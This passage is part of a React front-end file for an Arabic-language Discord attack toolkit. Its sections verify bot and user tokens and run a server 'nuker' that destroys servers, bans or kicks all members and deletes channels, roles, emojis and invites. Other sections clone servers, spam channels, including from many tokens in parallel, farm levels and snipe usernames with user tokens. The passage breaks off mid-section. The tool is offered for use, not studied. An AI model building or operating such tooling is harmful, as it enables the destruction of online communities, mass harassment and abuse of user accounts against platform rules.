          {/* Categorized mobile sections */}
          <div className="px-4 pb-4 space-y-3 max-h-[calc(70vh - 120px)] overflow-y-auto">
            {sidebarCategories.map(cat => {
              const filtered = filteredSections(cat.ids)
              if (sidebarSearch.trim() && filtered.length === 0) return null
              return (
                <div key={cat.name}>
                  <div className="flex items-center gap-2 mb-2">
                    <span className="text-[11px]">{cat.icon}</span>
                    <span className={`text-[10px] font-bold ${cat.prime ? 'text-yellow-400' : 'text-slate-500'}`}>{cat.name}</span>
                    <span className="sidebar-count-badge">{filtered.length}</span>
                  </div>
                  <div className="grid grid-cols-4 gap-2">
                    {filtered.map(id => {
                      const s = sections.find(sec => sec.id === id)
                      if (!s) return null
                      return (
                        <button
                          key={s.id}
                          onClick={() => {
                            if (s.id === 'profile') { setShowProfile(true); const sheet = document.getElementById('mobile-sections-sheet'); if (sheet) sheet.classList.remove('open'); return; }
                            setSection(s.id);
                            clearState();
                            const sheet = document.getElementById('mobile-sections-sheet');
                            if (sheet) sheet.classList.remove('open');
                          }}
                          className={`mobile-section-btn ${section === id ? 'active' : 'text-slate-400'} ${s.prime ? 'border-yellow-500/30' : ''}`}
                          style={{ touchAction: 'manipulation' }}
                        >
                          <span>{s.icon}</span>
                          <span className={s.prime ? 'text-yellow-400/90' : ''}>{s.name}</span>
                        </button>
                      )
                    })}
                  </div>
                </div>
              )
            })}
          </div>
        </div>

        <main className="flex-1 p-4 lg:p-6 pb-28 lg:pb-8">
          <div className="max-w-2xl mx-auto">

            {loading && (<div className="mb-4 animate-fade-in"><div className="glass-card rounded-xl p-3.5 border border-emerald-500/15 flex items-center gap-3"><div className="trj-spinner" /><span className="text-sm text-emerald-400/80">{progress || '⏳ جاري التنفيذ...'}</span></div></div>)}

            {/* ==================== VERIFY ==================== */}
            {section === 'verify' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-slate-700/30 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔑</span><h2 className="text-xl font-black text-gradient-green">تحقق من التوكن</h2></div>
                <p className="text-slate-500 text-sm mb-5">تحقق من صلاحية أي توكن (بوت / يوزر) مع معلومات تفصيلية</p>
                <TokenInput label="🎫 التوكن" value={verifyToken} onChange={setVerifyToken} onHelp={() => setShowTokenGuide(true)} />
                <ActionBtn text="🔍 تحقق الآن" loading={loading} onClick={async () => { const data = await api('verify', { token: verifyToken }); if (data) setVerifyData({ type: data.type, name: data.name, id: data.id, email: data.email, nitro: data.nitro, verified: data.verified, createdAt: data.createdAt, flags: data.flags }) }} />
                {verifyData && (<div className="mt-5 bg-slate-800/50 rounded-2xl p-6 border border-slate-700/20 text-center animate-fade-in">
                  <div className="text-5xl mb-3">{verifyData.type === 'bot' ? '🤖' : '👤'}</div>
                  <div className="text-xl font-black text-gradient-green mb-1">{verifyData.type === 'bot' ? 'بوت' : 'حساب يوزر'}</div>
                  <div className="text-emerald-300 text-lg font-medium">{verifyData.name}</div>
                  <div className="text-xs text-slate-500 font-mono mt-2">{verifyData.id}</div>
                  <div className="grid grid-cols-2 gap-2 mt-4">{verifyData.email && <InfoPill label="البريد" value={verifyData.email} />}{verifyData.nitro && <InfoPill label="نيترو" value={verifyData.nitro} />}{verifyData.verified && <InfoPill label="الحالة" value={verifyData.verified} />}{verifyData.createdAt && <InfoPill label="التسجيل" value={verifyData.createdAt} />}</div>
                </div>)}
              </div></div>
            )}

            {/* ==================== NUKER ==================== */}
            {section === 'nuker' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-red-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">💥</span><h2 className="text-xl font-black text-red-400">نيوكر سيرفر</h2></div>
                <p className="text-slate-500 text-sm mb-5">⚡ فائق السرعة - 50 روم بالتوازي + 100 حظر/طرد بالتوازي + كشف تلقائي للـ Rate Limit</p>
                <TokenInput label="🎫 التوكن" value={nukerToken} onChange={setNukerToken} accent="red" onHelp={() => setShowTokenGuide(true)} />
                <TextInput label="📋 أيدي السيرفر" value={guildId} onChange={setGuildId} placeholder="Guild ID" accent="red" />
                <div className="bg-red-500/5 rounded-xl p-4 mb-5 border border-red-500/15">
                  <h3 className="text-xs font-bold text-red-400 mb-3 flex items-center gap-1.5">⚙️ خيارات</h3>
                  <div className="grid grid-cols-2 gap-3 mb-3">
                    <div><label className="text-[11px] text-red-300/70">اسم الرومات الجديدة</label><input type="text" value={nukeChannelName} onChange={e => setNukeChannelName(e.target.value)} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-red-300/70">تغيير اسم الرومات لـ</label><input type="text" value={nukeRenameCh} onChange={e => setNukeRenameCh(e.target.value)} placeholder="nuked" className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-red-300/70">عدد الرومات (max 500)</label><input type="number" value={nukeChannelCount} onChange={e => setNukeChannelCount(Math.min(Number(e.target.value), 500))} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-red-300/70">رسائل لكل روم</label><input type="number" value={nukeMsgPerChannel} onChange={e => setNukeMsgPerChannel(Number(e.target.value))} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
                    <div><label className="text-[11px] text-red-300/70">Slowmode (ثانية, 0=إيقاف)</label><input type="number" value={nukeSlowmode} onChange={e => setNukeSlowmode(Number(e.target.value))} min={0} max={21600} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 focus:outline-none focus:border-red-400/50 transition-colors" /></div>
                  </div>
                  <div><label className="text-[11px] text-red-300/70">💬 رسالة السبام</label><textarea value={nukeMsg} onChange={e => setNukeMsg(e.target.value)} rows={2} className="w-full bg-black/30 border border-red-500/30 rounded-lg px-3 py-2 text-sm text-white mt-1 resize-none focus:outline-none focus:border-red-400/50 transition-colors" /></div>
                </div>
                <div className="grid grid-cols-2 sm:grid-cols-3 gap-2">
                  <NukerBtn text="💀 تدمير كامل" color="red" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'destroy', channelName: nukeChannelName, channelCount: nukeChannelCount, msgPerChannel: nukeMsgPerChannel, message: nukeMsg, name: nukeChannelName })} />
                  <NukerBtn text="💥 نيوكر (رومات+سبام)" color="red" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'nuke', channelName: nukeChannelName, channelCount: nukeChannelCount, msgPerChannel: nukeMsgPerChannel, message: nukeMsg })} />
                  <NukerBtn text="🔨 حظر الكل" color="red" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'banall' })} />
                  <NukerBtn text="👢 طرد الكل" color="orange" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'kickall' })} />
                  <NukerBtn text="📢 سبام" color="orange" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'spam', message: nukeMsg, msgPerChannel: nukeMsgPerChannel })} />
                  <NukerBtn text="🗑️ حذف الرومات" color="gray" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'delete_channels' })} />
                  <NukerBtn text="🗑️ حذف الرتب" color="gray" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'delete_roles' })} />
                  <NukerBtn text="🔤 تغيير أسماء الرومات" color="cyan" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'rename_channels', renameChannels: nukeRenameCh })} />
                  <NukerBtn text="🔤 تغيير اسم السيرفر" color="gray" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'rename', name: nukeChannelName })} />
                  <NukerBtn text="🎭 إنشاء 50 رتبة" color="purple" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'create_roles', createRolesCount: 50, rolesName: nukeRenameCh })} />
                  <NukerBtn text="🔢 عدد الرتب" color="purple" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'create_roles', createRolesCount: Math.max(nukeChannelCount, 1), rolesName: nukeRenameCh })} />
                  <NukerBtn text="😀 حذف الإيموجي" color="yellow" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'delete_emojis' })} />
                  <NukerBtn text="⏱️ تفعيل Slowmode" color="orange" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'slowmode', slowmodeSeconds: nukeSlowmode || 21600 })} />
                  <NukerBtn text="📺 إنشاء رومات فقط" color="green" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'create_channels', channelName: nukeChannelName, channelCount: nukeChannelCount, msgPerChannel: nukeMsgPerChannel, message: nukeMsg })} />
                  <NukerBtn text="📁 إنشاء كاتيجوريات" color="green" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'create_categories', channelName: nukeChannelName, channelCount: nukeChannelCount })} />
                  <NukerBtn text="🔗 حذف الدعوات" color="purple" loading={loading} onClick={() => api('nuker', { token: nukerToken, guildId, action: 'delete_invites' })} />
                </div>
              </div></div>
            )}

            {/* ==================== COPY ==================== */}
            {section === 'copy' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-slate-700/30 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📋</span><h2 className="text-xl font-black text-gradient-green">نسخ سيرفر</h2></div>
                <p className="text-slate-500 text-sm mb-5">نسخ سيرفر كامل متتالي - رتب + رومات + إعدادات + إيموجي + ستكرز + أوتو مود + صلاحيات</p>
                <TokenInput label="🎫 التوكن" value={copyToken} onChange={setCopyToken} onHelp={() => setShowTokenGuide(true)} /><TextInput label="📥 أيدي المصدر" value={sourceId} onChange={setSourceId} placeholder="Source Guild ID" /><TextInput label="📤 أيدي الهدف" value={targetId} onChange={setTargetId} placeholder="Target Guild ID" />
                <div className="flex gap-3 mb-5 flex-wrap">{[{ key: 'roles' as const, label: '🎭 رتب' }, { key: 'channels' as const, label: '📺 رومات' }, { key: 'settings' as const, label: '⚙️ إعدادات' }].map(opt => (<label key={opt.key} className="flex items-center gap-2 text-xs text-emerald-300/80 bg-slate-800/50 px-3 py-2 rounded-lg border border-slate-700/20 cursor-pointer hover:bg-slate-700/30 transition-colors"><input type="checkbox" checked={copyOptions[opt.key]} onChange={e => setCopyOptions({ ...copyOptions, [opt.key]: e.target.checked })} className="accent-emerald-500 w-3.5 h-3.5" />{opt.label}</label>))}</div>
                <ActionBtn text="📋 بدء النسخ" loading={loading} onClick={async () => {
                  if (!copyToken || !sourceId || !targetId) { setResult('❌ أدخل التوكن + أيدي المصدر والهدف'); return }
                  setLoading(true); setProgress('📋 جاري النسخ...'); setResult(''); setStats(null)
                  try {
                    const ctrl = new AbortController()
                    const timer = setTimeout(() => ctrl.abort(), 300000)
                    const res = await fetch('/api/copy', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: copyToken, sourceId, targetId, options: copyOptions }), signal: ctrl.signal })
                    clearTimeout(timer)
                    if (!res.ok) { const err = await res.json().catch(() => ({ error: 'خطأ في الاتصال' })); setResult('❌ ' + (err.error || `HTTP ${res.status}`)); setLoading(false); setProgress(''); return }
                    const ct = res.headers.get('content-type') || ''
                    if (!ct.includes('text/event-stream')) {
                      const data = await res.json().catch(() => null)
                      if (data?.error) { setResult('❌ ' + data.error) }
                      else if (data?.success) { setResult(data.message || '✅ تم!') }
                      else { setResult('❌ خطأ في الاستجابة') }
                      setLoading(false); setProgress(''); return
                    }
                    const reader = res.body?.getReader()
                    if (!reader) { setResult('❌ خطأ في الاتصال'); setLoading(false); setProgress(''); return }
                    const decoder = new TextDecoder(); let buffer = ''
                    while (true) {
                      const { done, value } = await reader.read()
                      if (done) break
                      buffer += decoder.decode(value, { stream: true })
                      const lines = buffer.split('\n'); buffer = lines.pop() || ''
                      for (const line of lines) {
                        if (!line.startsWith('data: ')) continue
                        try {
                          const event = JSON.parse(line.substring(6))
                          if (event.type === 'progress') setProgress(event.message)
                          else if (event.type === 'stats') setStats(event.stats)
                          else if (event.type === 'done') { if (event.success) { setResult(event.message || '✅ تم النسخ بنجاح!'); if (event.stats) setStats(event.stats) } else setResult('❌ ' + (event.error || 'فشل')) }
                          else if (event.type === 'error') setResult('❌ ' + event.message)
                        } catch {}
                      }
                    }
                    if (!result && !stats) setResult('⚠️ انتهت العملية بدون نتيجة واضحة')
                  } catch (e: any) { if (e.name === 'AbortError') setResult('❌ انتهى وقت الانتظار (5 دقائق) - السيرفر كبير جداً'); else setResult('❌ خطأ في الاتصال') }
                  setLoading(false); setProgress('')
                }} />
              </div></div>
            )}

            {/* ==================== SPAM ==================== */}
            {section === 'spam' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-orange-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">⚡</span><h2 className="text-xl font-black text-orange-400">تسطير</h2></div>
                <p className="text-slate-500 text-sm mb-5">إرسال 5 رسائل بالتوازي - أسرع بمرتين!</p>
                <TokenInput label="🎫 التوكن" value={spamToken} onChange={setSpamToken} accent="orange" onHelp={() => setShowTokenGuide(true)} /><TextInput label="📺 أيدي الروم" value={channelId} onChange={setChannelId} placeholder="Channel ID" accent="orange" />
                <div className="mb-4"><label className="text-[11px] text-orange-300/70 mb-1 block">📝 الرسائل (كل سطر يرسل لوحده)</label><textarea value={messages} onChange={e => setMessages(e.target.value)} placeholder={"رسالة 1\nرسالة 2\nرسالة 3"} rows={4} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 resize-none transition-colors" /></div>
                <div className="grid grid-cols-2 gap-3 mb-5">
                  <div><label className="text-[11px] text-orange-300/70 mb-1 block">⏱️ المدة (ثانية)</label><input type="number" value={duration} onChange={e => setDuration(Number(e.target.value))} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                  <div><label className="text-[11px] text-orange-300/70 mb-1 block">🚀 السرعة (ثانية)</label><input type="number" value={speed} onChange={e => setSpeed(Number(e.target.value))} step="0.1" className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                </div>
                <ActionBtn text="⚡ بدء التسطير" loading={loading} color="orange" onClick={() => { const msgList = messages.split('\n').map(m => m.trim()).filter(Boolean); if (msgList.length === 0) { setResult('❌ أدخل رسالة واحدة على الأقل'); return }; api('spam', { token: spamToken, channelId, messages: msgList, duration, speed }) }} />
              </div></div>
            )}

            {/* ==================== LEVELING ==================== */}
            {section === 'leveling' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-slate-700/30 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">📈</span><h2 className="text-xl font-black text-gradient-green">تلفيل حساب</h2></div>
                <p className="text-slate-500 text-sm mb-5">رفع لفل الحساب - 5 رسائل بالتوازي</p>
                <TokenInput label="🎫 التوكن" value={levelingToken} onChange={setLevelingToken} onHelp={() => setShowTokenGuide(true)} /><TextInput label="📺 أيدي الروم" value={levelingChannelId} onChange={setLevelingChannelId} placeholder="Channel ID" />
                <div className="grid grid-cols-2 gap-3 mb-5">
                  <div><label className="text-[11px] text-green-300/70 mb-1 block">⏱️ المدة (ثانية)</label><input type="number" value={levelingDuration} onChange={e => setLevelingDuration(Number(e.target.value))} className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-green-400/50 transition-colors" /></div>
                  <div><label className="text-[11px] text-green-300/70 mb-1 block">🚀 السرعة (ثانية)</label><input type="number" value={levelingSpeed} onChange={e => setLevelingSpeed(Number(e.target.value))} step="0.1" className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-green-400/50 transition-colors" /></div>
                </div>
                <ActionBtn text="📈 بدء التلفيل" loading={loading} onClick={() => api('leveling', { token: levelingToken, channelId: levelingChannelId, duration: levelingDuration, speed: levelingSpeed })} />
              </div></div>
            )}

            {/* ==================== SNIPER ==================== */}
            {section === 'sniper' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-slate-700/30 shadow-xl shadow-black/20">
                <div className="flex items-center justify-between mb-1"><div className="flex items-center gap-3"><span className="text-2xl">🎯</span><h2 className="text-xl font-black text-gradient-green">صيد يوزرات</h2></div>
                  <div className="flex gap-1.5">
                    <button onClick={async () => { if (!sniperToken) { setResult('❌ أدخل التوكن أولاً'); return }; setLoading(true); setProgress('🔍 جلب معلومات الحساب...'); try { const res = await fetch('/api/sniper', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: sniperToken, action: 'accountInfo' }) }); const data = await res.json(); if (data.success) { setSniperAccountInfo(data.info); setResult('') } else { setResult(`❌ ${data.error}`) } } catch { setResult('❌ خطأ في الاتصال') }; setLoading(false); setProgress('') }} className="text-xs text-cyan-400 bg-cyan-500/10 px-2.5 py-1.5 rounded-lg border border-cyan-500/20 hover:bg-cyan-500/20 transition-colors cursor-pointer">👤</button>
                    <button onClick={async () => { if (!sniperToken) { setResult('❌ أدخل التوكن أولاً'); return }; setLoading(true); setProgress('🧪 فحص تجريبي بـ 3 طرق...'); try { const res = await fetch('/api/sniper', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: sniperToken, action: 'test' }) }); const data = await res.json(); if (data.success) { const t = data.test; let out = '🧪 فحص تجريبي - 3 طرق\nالحساب: ' + t.account + ' | MFA: ' + (t.mfa ? 'نعم' : 'لا') + ' | Phone: ' + (t.phone ? 'نعم' : 'لا') + ' | Verified: ' + (t.verified ? 'نعم' : 'لا') + '\n'; for (const r of t.results) { out += '\n━━ ' + r.label + ' ━━\n'; for (const m of r.results) { out += '  [' + (m.method || '?') + '] ' + m.status; if (m.debug) out += ' (' + m.debug + ')'; out += '\n'; } } setResult(out) } else { setResult('❌ ' + data.error) } } catch (e: any) { setResult('❌ خطأ: ' + (e.message || 'غير معروف')) }; setLoading(false); setProgress('') }} className="text-xs text-purple-400 bg-purple-500/10 px-2.5 py-1.5 rounded-lg border border-purple-500/20 hover:bg-purple-500/20 transition-colors cursor-pointer">🧪 فحص</button>
                  </div>
                </div>
                <p className="text-slate-500 text-sm mb-5">{'⚡ يستخدم 3 طرق: pomelo-attempt + PATCH /users/@me + GET /users/{name}'}</p>
                {sniperAccountInfo && (<div className="mb-4 bg-cyan-500/5 rounded-xl p-4 border border-cyan-500/15 animate-fade-in">
                  <div className="flex items-center gap-3 mb-2"><div className="w-10 h-10 rounded-full bg-gradient-to-br from-cyan-400 to-blue-500 flex items-center justify-center text-white font-bold text-sm">{(sniperAccountInfo.username || '?')[0].toUpperCase()}</div><div><div className="text-sm font-bold text-cyan-300">{sniperAccountInfo.username}</div><div className="text-[10px] text-cyan-500/60 font-mono">{sniperAccountInfo.id}</div></div><div className="ml-auto flex gap-2">{sniperAccountInfo.mfa && <span className="text-[10px] text-green-400 bg-green-500/10 px-2 py-0.5 rounded-full border border-green-500/20">🔒 MFA</span>}{sniperAccountInfo.nitro !== 'None' && <span className="text-[10px] text-purple-400 bg-purple-500/10 px-2 py-0.5 rounded-full border border-purple-500/20">💎 {sniperAccountInfo.nitro}</span>}</div></div>
                  {availableNames.length > 0 && (<div className="mt-3"><button onClick={async () => { const name = availableNames[0]; setLoading(true); setProgress(`🔄 جاري تغيير اليوزر إلى: ${name}...`); try { const res = await fetch('/api/sniper', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ token: sniperToken, action: 'changeUsername', targetUsername: name }) }); const data = await res.json(); if (data.success) setResult(`✅ تم تغيير اليوزر إلى: ${name}`); else setResult(`❌ ${data.error}`) } catch { setResult('❌ خطأ') }; setLoading(false); setProgress('') }} className="text-xs text-green-400 bg-green-500/15 px-3 py-2 rounded-lg border border-green-500/25 hover:bg-green-500/25 transition-colors cursor-pointer font-bold">🎯 خذ {availableNames[0]}</button></div>)}
                </div>)}
                <TokenInput label="🎫 توكن يوزر" value={sniperToken} onChange={setSniperToken} onHelp={() => setShowTokenGuide(true)} />
                <div className="bg-red-500/5 rounded-xl p-3 mb-5 border border-red-500/10"><p className="text-[11px] text-red-400/80">⚠️ يجب استخدام توكن يوزر (User Token) وليس توكن بوت!</p></div>
                <div className="flex gap-2 mb-4">{['auto', 'manual'].map(mode => (<button key={mode} onClick={() => setSniperMode(mode as any)} className={`flex-1 py-2.5 rounded-xl text-sm font-bold transition-all cursor-pointer ${sniperMode === mode ? 'bg-green-500/20 text-green-400 border border-green-500/30' : 'bg-black/20 text-green-600 hover:text-green-400 border border-transparent'}`}>{mode === 'auto' ? '🎲 تلقائي' : '✏️ يدوي'}</button>))}</div>
                {sniperMode === 'auto' ? (<>
                  <div className="grid grid-cols-2 gap-3 mb-4"><div><label className="text-[11px] text-green-300/70 mb-1 block">🔢 العدد</label><input type="number" value={sniperCount} onChange={e => setSniperCount(Number(e.target.value))} className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-green-400/50 transition-colors" /></div><div><label className="text-[11px] text-green-300/70 mb-1 block">📏 الطول</label><input type="number" value={sniperLength} onChange={e => setSniperLength(Number(e.target.value))} className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-green-400/50 transition-colors" /></div></div>
                  <div className="mb-4"><label className="text-[11px] text-green-300/70 mb-2 block">🎨 نمط التوليد</label><div className="grid grid-cols-5 sm:grid-cols-5 gap-1">{[{ id: 'random', label: 'عشوائي', icon: '🎲' }, { id: 'consonants', label: 'ساكنات', icon: '🔤' }, { id: 'numbers', label: 'أرقام', icon: '🔢' }, { id: 'dictionary', label: 'كلمات', icon: '📖' }, { id: 'rare', label: 'نادر', icon: '💎' }].map(p => (<button key={p.id} onClick={() => setSniperPattern(p.id)} className={`py-1.5 sm:py-2 rounded-lg text-[9px] sm:text-[10px] font-bold transition-all cursor-pointer text-center ${sniperPattern === p.id ? 'bg-green-500/20 text-green-400 border border-green-500/30' : 'bg-black/20 text-green-600 hover:text-green-400 border border-transparent'}`}><span className="text-sm sm:text-base block mb-0.5">{p.icon}</span><span className="hidden sm:inline">{p.label}</span></button>))}</div></div>
                  <div className="flex gap-3 mb-4"><label className="flex items-center gap-2 text-xs text-emerald-300/80 bg-slate-800/50 px-3 py-2 rounded-lg border border-slate-700/20 cursor-pointer"><input type="checkbox" checked={useDot} onChange={e => setUseDot(e.target.checked)} className="accent-emerald-500" /> نقطة (.)</label><label className="flex items-center gap-2 text-xs text-emerald-300/80 bg-slate-800/50 px-3 py-2 rounded-lg border border-slate-700/20 cursor-pointer"><input type="checkbox" checked={useUnderscore} onChange={e => setUseUnderscore(e.target.checked)} className="accent-emerald-500" /> شرطة (_)</label></div>
                </>) : (<div className="mb-4"><label className="text-[11px] text-green-300/70 mb-1 block">📝 اليوزرات (كل يوزر سطر)</label><textarea value={usernames} onChange={e => setUsernames(e.target.value)} placeholder={"username1\nusername2"} rows={4} className="w-full bg-black/30 border border-green-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-green-700/30 focus:outline-none focus:border-green-400/50 resize-none font-mono transition-colors" /></div>)}
                <ActionBtn text="🎯 بدء الفحص" loading={loading} onClick={async () => { const list = sniperMode === 'auto' ? Array.from({ length: sniperCount }, () => genUsername()) : usernames.split('\n').map(u => u.trim()).filter(Boolean); if (list.length === 0) { setResult('❌ أدخل يوزر واحد على الأقل'); return }; await api('sniper', { token: sniperToken, usernames: list, debug: true }) }} />
                {sniperStats && (<div className="mt-4 grid grid-cols-2 sm:grid-cols-4 gap-2 animate-fade-in"><div className="bg-green-500/8 rounded-xl p-2.5 border border-green-500/10 text-center"><div className="text-lg font-black text-green-400">{sniperStats.available}</div><div className="text-[9px] text-green-300/60">✅ متاح</div></div><div className="bg-red-500/8 rounded-xl p-2.5 border border-red-500/10 text-center"><div className="text-lg font-black text-red-400">{sniperStats.taken}</div><div className="text-[9px] text-red-300/60">❌ محجوز</div></div><div className="bg-yellow-500/8 rounded-xl p-2.5 border border-yellow-500/10 text-center"><div className="text-lg font-black text-yellow-400">{sniperStats.errors}</div><div className="text-[9px] text-yellow-300/60">⚠️ خطأ</div></div><div className="bg-blue-500/8 rounded-xl p-2.5 border border-blue-500/10 text-center"><div className="text-lg font-black text-blue-400">{sniperStats.rateLimitHits || 0}</div><div className="text-[9px] text-blue-300/60">⏳ RL</div></div></div>)}
                {availableNames.length > 0 && (<div className="mt-4 bg-green-500/8 rounded-xl p-4 border border-green-500/20 animate-fade-in"><div className="flex items-center justify-between mb-2"><h3 className="font-bold text-green-400 text-sm">🏆 اليوزرات المتاحة! ({availableNames.length})</h3><button onClick={() => { navigator.clipboard.writeText(availableNames.join('\n')); setResult('📋 تم النسخ!') }} className="text-[10px] text-green-300 bg-green-500/15 px-2.5 py-1 rounded-lg border border-green-500/20 hover:bg-green-500/25 cursor-pointer transition-colors">📋 نسخ الكل</button></div><div className="flex flex-wrap gap-1.5">{availableNames.map((name, i) => (<button key={i} onClick={() => { navigator.clipboard.writeText(name); setResult(`📋 تم نسخ: ${name}`) }} className="text-xs font-mono text-green-400 bg-green-500/10 px-2.5 py-1.5 rounded-lg border border-green-500/20 hover:bg-green-500/20 cursor-pointer transition-colors">{name} 📋</button>))}</div></div>)}
                {sniperResults.length > 0 && (<div className="mt-4 bg-black/30 rounded-2xl p-4 border border-green-500/15 animate-fade-in"><div className="flex items-center justify-between mb-3"><h3 className="font-bold text-green-400 text-sm">📊 النتائج ({sniperResults.length})</h3><button onClick={() => { const text = sniperResults.map(r => `${r.username} | ${r.status}${r.debug ? ' | ' + r.debug : ''}`).join('\n'); navigator.clipboard.writeText(text); setResult('📋 تم النسخ!') }} className="text-[10px] text-white/50 bg-white/5 px-2.5 py-1 rounded-lg border border-white/10 hover:bg-white/10 cursor-pointer transition-colors">📋 نسخ الكل</button></div><div className="space-y-1 max-h-72 overflow-auto">{sniperResults.map((r, i) => (<div key={i} className={`px-3 py-2 rounded-lg text-xs font-mono ${r.color === 'green' ? 'bg-green-500/15 text-green-400 border border-green-500/20' : r.color === 'red' ? 'bg-red-500/8 text-red-400/70 border border-red-500/10' : 'bg-yellow-500/8 text-yellow-400/70 border border-yellow-500/10'}`}><div className="flex justify-between items-center"><span className="cursor-pointer hover:underline" onClick={() => { navigator.clipboard.writeText(r.username); setResult(`📋 ${r.username}`) }}>{r.username}</span><span className="font-medium">{r.status}</span></div>{r.debug && <div className="text-[9px] opacity-60 mt-0.5">{r.debug}</div>}</div>))}</div></div>)}
              </div></div>
            )}

            {/* ==================== MULTI-SPAM ==================== */}
            {section === 'multi-spam' && (
              <div className="animate-fade-in"><div className="glass-card card-hover rounded-2xl p-6 border border-orange-500/15 shadow-xl shadow-black/20">
                <div className="flex items-center gap-3 mb-1"><span className="text-2xl">🔥</span><h2 className="text-xl font-black text-orange-400">سبام بأكثر من توكن</h2></div>
                <p className="text-slate-500 text-sm mb-5">⚡ أقوى سبام - عدة توكنات ترسل بالتوازي! حتى 15 رسالة في نفس الوقت</p>
                <div className="mb-4"><label className="text-[11px] text-orange-300/70 mb-1 block">🎫 التوكنات (كل توكن سطر - أكثر توكن = أسرع)</label><textarea value={multiSpamTokens} onChange={e => setMultiSpamTokens(e.target.value)} placeholder={"توكن 1\nتوكن 2\nتوكن 3"} rows={4} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 resize-none font-mono transition-colors" /></div>
                <TextInput label="📺 أيدي الروم" value={msChannelId} onChange={setMsChannelId} placeholder="Channel ID" accent="orange" />
                <div className="mb-4"><label className="text-[11px] text-orange-300/70 mb-1 block">📝 الرسائل (كل سطر يرسل لوحده)</label><textarea value={msMessages} onChange={e => setMsMessages(e.target.value)} placeholder={"رسالة 1\nرسالة 2"} rows={3} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm placeholder-orange-700/30 focus:outline-none focus:border-orange-400/50 resize-none transition-colors" /></div>
                <div className="grid grid-cols-2 gap-3 mb-5">
                  <div><label className="text-[11px] text-orange-300/70 mb-1 block">⏱️ المدة (ثانية)</label><input type="number" value={msDuration} onChange={e => setMsDuration(Number(e.target.value))} className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                  <div><label className="text-[11px] text-orange-300/70 mb-1 block">🚀 السرعة (ثانية)</label><input type="number" value={msSpeed} onChange={e => setMsSpeed(Number(e.target.value))} step="0.1" className="w-full bg-black/30 border border-orange-500/30 rounded-xl px-4 py-3 text-white text-sm focus:outline-none focus:border-orange-400/50 transition-colors" /></div>
                </div>
                <div className="bg-orange-500/5 rounded-xl p-3 mb-5 border border-orange-500/10"><p className="text-[11px] text-orange-500/70 leading-relaxed">⚡ التزامن = توكنات × 2 (أقصى 15)<br />🔄 التوكنات تتناوب بالتساوي</p></div>
